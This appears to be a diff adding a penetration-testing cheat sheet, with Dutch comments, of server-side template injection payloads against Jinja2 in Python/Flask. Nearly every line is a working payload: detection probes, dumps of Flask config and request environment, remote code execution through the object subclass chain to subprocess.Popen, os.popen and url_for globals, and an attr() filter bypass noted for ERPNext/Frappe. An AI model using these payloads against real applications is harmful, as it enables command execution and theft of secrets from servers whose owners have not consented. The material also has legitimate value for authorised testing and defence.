@@ -1,0 +1,23 @@
+# SSTI - Jinja2 (Python/Flask) RCE
+# Detectie: {{7*7}} -> 49, {{7*'7'}} -> '7777777' (Python string multiply)
+# === Info disclosure (Flask) ===
+{{config|pprint}}
+{{request.environ}}
+{{self.__dict__}}
+# === RCE via MRO chain (subprocess.Popen) ===
+{{''.__class__.__mro__[1].__subclasses__()}}
+# Zoek subprocess.Popen index (bijv. 421) in output, dan:
+{{''.__class__.__mro__[1].__subclasses__()[421]('id',shell=True,stdout=-1).communicate()}}
+# === RCE bypass __ filter (attr() methode) ===
+{% set cls = "__class__" %}
+{% set mro = "__mro__" %}
+{% set sub = "__subclasses__" %}
+{% set r = ""|attr(cls)|attr(mro) %}
+{% set s = r[1]|attr(sub)() %}
+{{s[421]("id",shell=True,stdout=-1).communicate()}}
+# === RCE via os.popen ===
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+# === RCE via config (als SECRET_KEY bekend) ===
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+# Tip: Index van Popen verschilt per Python versie - enumerate eerst
+# Tip: |attr() bypassed __ filtering in ERPNext/Frappe
